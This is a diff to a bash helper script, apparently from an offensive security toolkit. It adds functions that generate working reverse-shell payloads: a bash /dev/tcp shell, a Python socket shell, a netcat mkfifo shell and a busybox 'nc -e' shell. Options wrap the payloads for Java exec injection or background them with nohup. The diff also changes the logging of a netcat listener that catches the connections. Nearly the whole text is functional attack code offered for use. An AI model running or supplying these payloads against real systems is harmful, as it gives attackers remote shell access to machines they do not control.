@@ -3,20 +3,57 @@ SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
 source $SCRIPTDIR/general.sh
 source $SCRIPTDIR/network.sh
 
-get_bash_reverse_shell() {
+
+prepare_generic_linux_shell() {
     if [ -z "$host_port" ]; then
         host_port=4444  # Default reverse shell port
     fi
     if [ -z "$host_ip" ]; then
         host_ip=$(get_host_ip)  # Function to get the host IP address
     fi
-    reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
+}
+
+get_bash_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
     if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
         reverse_shell='nohup '"$reverse_shell"' &'
     fi
-    if [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then        
+      if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
+    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then        
         reverse_shell="bash -c \"$reverse_shell\""        
+
     fi
+    echo "$reverse_shell"
+}
+
+get_python_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
+        #reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"python\", \"-c\" , \"$reverse_shell\"}"
+    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
+        reverse_shell="python -c '$reverse_shell'"
+
+    fi
+    echo "$reverse_shell"
+}
+get_nc_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"$host_ip"' '"$host_port"' >/tmp/f'
+    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
+        reverse_shell="/bin/sh $host_ip $host_port"
+        reverse_shell="{\"nc\", \"-c\" , \"$reverse_shell\"}"
+    fi
+    echo "$reverse_shell"
+}
+
+get_busybox_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell='busybox nc '"$host_ip"' '"$host_port"' -e /bin/sh'
     echo "$reverse_shell"
 }
 
@@ -181,8 +218,8 @@ start_listener() {
     if [ -z "$host_port" ]; then
         host_port=4444  # Default reverse shell port
     fi
-    if [ -z "$trail_log" ]; then
-        trail_log="trail.log"
+    if [ -z "$log_dir" ]; then
+        log_dir="./log"
     fi
     local stty_size=$(stty size)
     local terminal_type=$(echo $TERM)
@@ -204,9 +241,9 @@ start_listener() {
     echo "Netcat options: $netcat_options"
     # for interactive
     if [ ! -z "$interactive_shell" ]; then
-        stty raw -echo; (stty size; cat) | nc $netcat_options 2>&1 | tee >(remove_color_to_log >> $trail_log)
+        stty raw -echo; (stty size; cat) | nc $netcat_options 2>&1 | tee >(remove_color_to_log >> "$log_dir/listener_$host_port.log")
     else
-        nc $netcat_options 2>&1 | tee >(remove_color_to_log >> $trail_log)
+        nc $netcat_options 2>&1 | tee >(remove_color_to_log >> "$log_dir/listener_$host_port.log")
     fi
 }
 
